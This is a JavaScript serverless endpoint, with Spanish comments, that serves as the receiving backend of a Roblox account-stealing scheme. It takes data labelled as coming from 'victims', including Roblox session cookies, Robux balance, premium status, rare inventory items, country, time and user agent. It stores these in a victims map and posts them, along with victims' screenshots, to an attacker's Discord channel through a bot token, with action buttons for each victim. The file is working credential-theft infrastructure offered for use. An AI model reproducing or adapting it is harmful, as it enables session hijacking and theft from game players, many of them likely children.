// api/log.js - VERSIÓN CON CORS CORREGIDO
export default async function handler(req, res) {
    // Configurar CORS para TODAS las respuestas
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Access-Control-Max-Age', '86400');

    // Manejar preflight OPTIONS correctamente
    if (req.method === 'OPTIONS') {
        return res.status(204).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const data = req.body;

    // Manejar captura de pantalla
    if (data.type === 'screenshot') {
        try {
            const base64Data = data.image.split(',')[1];
            const buffer = Buffer.from(base64Data, 'base64');

            const formData = new FormData();
            formData.append('file', new Blob([buffer]), 'screenshot.png');
            formData.append('payload_json', JSON.stringify({
                content: `📸 **CAPTURA DE PANTALLA RECIBIDA**\nUsuario: ${data.userId || 'Desconocido'}`
            }));

            await fetch(`https://discord.com/api/v10/channels/${process.env.DISCORD_CHANNEL_ID}/messages`, {
                method: 'POST',
                headers: { 'Authorization': `Bot ${process.env.DISCORD_BOT_TOKEN}` },
                body: formData
            });
        } catch (error) {}
        return res.status(200).json({ status: 'ok' });
    }

    // Manejar limpieza
    if (data.type === 'cleanup') {
        try {
            await fetch(`https://discord.com/api/v10/channels/${process.env.DISCORD_CHANNEL_ID}/messages`, {
                method: 'POST',
                headers: {
                    'Authorization': `Bot ${process.env.DISCORD_BOT_TOKEN}`,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: `🧹 **DATOS LOCALES ELIMINADOS**\nUsuario: ${data.userId || 'Desconocido'}\nEstado: ${data.message || 'Limpieza completada'}`
                })
            });
        } catch (error) {}
        return res.status(200).json({ status: 'ok' });
    }

    // Guardar datos de la víctima
    const userId = data.roblox?.userId || `anon_${Date.now()}`;

    if (!global.victims) global.victims = new Map();
    global.victims.set(userId, {
        roblox: data.roblox || {},
        cookie: data.cookie || 'No disponible',
        pais: data.pais || 'Desconocido',
        fecha: data.fecha || '',
        hora: data.hora || '',
        userAgent: data.userAgent || ''
    });

    // Preparar embed
    const embed = {
        title: '🔔 ¡NUEVA VÍCTIMA CONECTADA!',
        color: 0x9b59b6,
        fields: [
            {
                name: '📌 PRINCIPAL',
                value: '`✅️CUENTA REAL/❌️ CUENTA RECIEN CREADA.`',
                inline: false
            },
            {
                name: '👤 Usuario Roblox',
                value: data.roblox?.username || 'No disponible',
                inline: true
            },
            {
                name: '🆔 ID',
                value: data.roblox?.userId?.toString() || 'No disponible',
                inline: true
            },
            {
                name: '💰 Robux',
                value: data.roblox?.robux?.toString() || '0',
                inline: true
            },
            {
                name: '⭐ Seguidores',
                value: data.roblox?.seguidores?.toString() || '0',
                inline: true
            },
            {
                name: '👥 Amigos',
                value: data.roblox?.amigos?.toString() || '0',
                inline: true
            },
            {
                name: '💱 Premium',
                value: data.roblox?.premium || 'No',
                inline: true
            },
            {
                name: '🔰 Verificado',
                value: data.roblox?.verified || 'No',
                inline: true
            },
            {
                name: '💼 **Inventario:**',
                value: `Headless: \`${data.roblox?.headless || 'No'}\`\nKorblox: \`${data.roblox?.korblox || 'No'}\``,
                inline: false
            },
            {
                name: '**Informacion Horaria:**',
                value: `🌍 País: \`${data.pais || 'Desconocido'}\`\n📅 Fecha: \`${data.fecha || ''}\`\n⏰ Hora Exacta: \`${data.hora || ''}\``,
                inline: false
            },
            {
                name: '🍪 Cookie:',
                value: `\`\`\`${data.cookie || 'No disponible'}\`\`\``,
                inline: false
            }
        ],
        footer: { text: `ID: ${userId}` }
    };

    // Botones
    const components = [
        {
            type: 1,
            components: [
                {
                    type: 2,
                    style: 1,
                    label: 'DISCORD',
                    custom_id: `discord_${userId}`,
                    emoji: { name: '🔵' }
                },
                {
                    type: 2,
                    style: 1,
                    label: 'ROBLOX',
                    custom_id: `roblox_${userId}`,
                    emoji: { name: '🔴' }
                }
            ]
        },
        {
            type: 1,
            components: [
                {
                    type: 2,
                    style: 2,
                    label: 'COMANDOS',
                    custom_id: `comandos_${userId}`,
                    emoji: { name: '⚫' }
                }
            ]
        }
    ];

    // Enviar a Discord
    const token = process.env.DISCORD_BOT_TOKEN;
    const channelId = process.env.DISCORD_CHANNEL_ID;

    if (!token || !channelId) {
        return res.status(500).json({ error: 'Config error' });
    }

    try {
        const response = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
            method: 'POST',
            headers: {
                'Authorization': `Bot ${token}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                content: '||@everyone||\n\nSelecciona una opcion:',
                embeds: [embed],
                components: components
            })
        });

        if (!response.ok) {
            return res.status(500).json({ error: 'Discord error' });
        }

        res.status(200).json({ status: 'ok', userId: userId });
        
    } catch (error) {
        res.status(500).json({ error: 'Server error' });
    }
}